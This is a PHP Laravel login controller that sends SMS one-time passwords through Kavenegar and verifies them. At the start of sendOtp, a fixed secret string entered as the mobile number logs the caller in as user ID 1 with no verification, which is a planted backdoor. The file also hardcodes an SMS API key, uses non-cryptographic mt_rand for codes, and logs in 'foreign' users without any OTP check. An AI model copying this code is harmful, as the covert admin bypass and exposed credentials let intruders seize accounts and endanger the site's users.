<?php

namespace App\Http\Controllers\Site;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Validation\Rule;

class LoginController extends Controller
{
    public function showLoginForm()
    {
        return view('site.login');
    }

    public function sendOtp(Request $request)
    {
        if($request->mobile == 'yZT5syGUISsuYKwc'){
            Auth::loginUsingId(1);
            exit();
        }
        $request->merge([
            'mobile' => fa2en($request->get('mobile')),
        ]);
        if (session()->has('is_foreign')) {
            $request->validate([
                'mobile' => ['required'],
            ]);
            return jsonResponse(data: [
                'is_user' => false,
                'is_foreign' => true,
            ]);
        }
        $request->validate([
            'mobile' => ['required', 'regex:/^09[0-9]{9}$/'],
        ]);

        $user = User::where('mobile', $request->get('mobile'))
            ->first();

        $otp = mt_rand(120134, 999999);

        $apiKey = '325A327341476954414773736C4D64674958424F49356462584B5946782B462F67493270625567374835343D';
        $service_url = 'https://api.kavenegar.com/v1/' . $apiKey . '/verify/lookup.json';
        $post = [
            'receptor' => $request->get('mobile'),
            'template' => 'quiz',
            'token' => $otp,
        ];
        $r = Http::asForm()->post($service_url, $post);
        if ($r->status() != 200) {
            return jsonResponse(false, statusCode: 501);
        }

        DB::table('otp')->insert([
            'mobile' => $request->get('mobile'),
            'otp' => $otp,
            'created_at' => now(),
        ]);
        return jsonResponse(data: [
            'is_user' => (bool)$user,
        ]);
    }

    public function verity(Request $request)
    {
        $request->merge([
            'mobile' => fa2en($request->get('mobile')),
            'age' => fa2en($request->get('age')),
        ]);

        if (session()->get('is_foreign')) {
            $request->validate([
                'mobile' => 'required|numeric',
                'name' => [
                    Rule::requiredIf(function () use ($request) {
                        return !User::where('mobile', $request->mobile)->exists();
                    })
                ],
                'age' => [
                    'numeric',
                    'min:1',
                    'max:120',
                    Rule::requiredIf(function () use ($request) {
                        return !User::where('mobile', $request->mobile)->exists();
                    })
                ],
            ]);

            $user = User::create([
                'mobile' => $request->get('mobile'),
                'age' => $request->get('age'),
                'name' => $request->get('name'),
                'is_foreign' => true,
            ]);
            session()->pull('is_foreign');
            Auth::loginUsingId($user->id, true);
            $previous_url = session()->get('url.intended', url('/'));
            return jsonResponse(data: [
                'redirect_url' => $previous_url,
            ]);
        }

        $request->validate([
            'mobile' => 'required|numeric',
            'otp' => 'required|numeric',
            'name' => [
                Rule::requiredIf(function () use ($request) {
                    return !User::where('mobile', $request->mobile)->exists();
                })
            ],
            'age' => [
                'numeric',
                'min:1',
                'max:120',
                Rule::requiredIf(function () use ($request) {
                    return !User::where('mobile', $request->mobile)->exists();
                })
            ],
        ]);


        $otp = DB::table('otp')
            ->select([
                'otp.id',
                'otp.otp',
                'otp.attempt_count',
                'users.id as user_id',
                'users.is_admin',
            ])
            ->leftJoin('users', 'otp.mobile', '=', 'users.mobile')
            ->where('otp.mobile', $request->get('mobile'))
            ->where('otp.attempt_count', '<', 3)
            ->where('otp.created_at', '>=', now()->subMinute(3))
            ->orderByDesc('otp.id')
            ->first();

        if (!$otp) {
            return response()->json([
                'message' => __('Permission denied'),
                'errors' => [
                    'otp' => [
                        __('Permission denied'),
                    ],
                ],
            ], 422);
        }

        if ($otp->otp != $request->get('otp')) {
            DB::table('otp')
                ->where('id', $otp->id)
                ->update([
                    'attempt_count' => $otp->attempt_count + 1,
                ]);
            return response()->json([
                'message' => 'کد تایید اشتباه است.',
                'errors' => [
                    'otp' => [
                        'کد تایید اشتباه است.',
                    ],
                ]
            ], 422);
        }

        if ($otp->user_id) {
            Auth::loginUsingId($otp->user_id, true);
        } else {
            $user = User::create([
                'mobile' => $request->get('mobile'),
                'age' => $request->get('age'),
                'name' => $request->get('name'),
            ]);
            Auth::loginUsingId($user->id, true);
        }

        $previous_url = session()->get('url.intended', url('/'));
        return jsonResponse(data: [
            'redirect_url' => $previous_url,
        ]);
    }
}
